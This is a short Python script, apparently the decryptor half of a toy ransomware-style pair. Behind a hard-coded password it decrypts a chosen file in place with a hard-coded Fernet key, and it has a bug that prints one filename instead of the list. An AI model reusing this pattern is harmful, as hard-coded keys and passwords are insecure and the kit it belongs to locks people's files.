from operator import concat
from cryptography.fernet import Fernet
import os
import time
key = 'z4PH1i1lqp1sxUZmSYc7bNwvF72U3VSNHOn8LpyJ45k='
files = []
for file in os.listdir():
    if file == "enc.py" or file == "dec.py":
        continue
    if os.path.isfile(file):
        files.append(file)

secret_pass = 'coffee'
print("The Files That Can be decrypted : \n")
print(file)
file_dec = input("Please Enter a filename from the list : ")

    
    
usr_pass = input("Please Enter You Password : ")
if usr_pass == secret_pass:
    with open(file_dec, "rb") as file_nd:
        contents = file_nd.read()
    contents_dec = Fernet(key).decrypt(contents)
    with open(file_dec, "wb") as file_nd:
        file_nd.write(contents_dec)
    print("the file " + file_dec + " Has Been decrypted.. Enjoy Your Coffee again.")
    time.sleep(2)
else:
    print("Incorrect Password.")
    time.sleep(2)